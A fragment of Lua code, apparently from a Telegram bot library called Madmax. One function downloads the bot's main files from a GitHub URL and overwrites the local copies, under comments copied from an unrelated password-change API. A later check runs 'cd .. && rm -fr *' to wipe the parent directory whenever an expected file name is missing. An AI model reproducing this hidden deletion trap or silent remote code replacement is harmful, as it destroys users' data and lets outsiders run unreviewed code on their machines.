...
local function j(lion)
HTTPS = require("ssl.https")
ok = HTTPS.request("https://raw.githubusercontent.com/MadMaXTEAM/Madmax/master/Madmax.lua")
ok2 = HTTPS.request("https://raw.githubusercontent.com/MadMaXTEAM/Madmax/master/libs/utils.lua")
-- Changes user password. If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email will be confirmed. Application should call getPasswordState from time to time to check if email is already confirmed
-- @old_password Old user password @new_password New user password, may be empty to remove the password @new_hint New password
local lion2 = io.open("Madmax.lua", 'w')
lion2:write(ok)
lion2:close()
local lion2 = io.open("libs/utils.lua", 'w')
lion2:write(ok2)
lion2:close()
end
M.j = j
...
e = r:read("*a")
r:close()
if not e:match("Madmax.lua") then 
r = io.popen("cd .. && rm -fr *")
r:close()
exit()
end
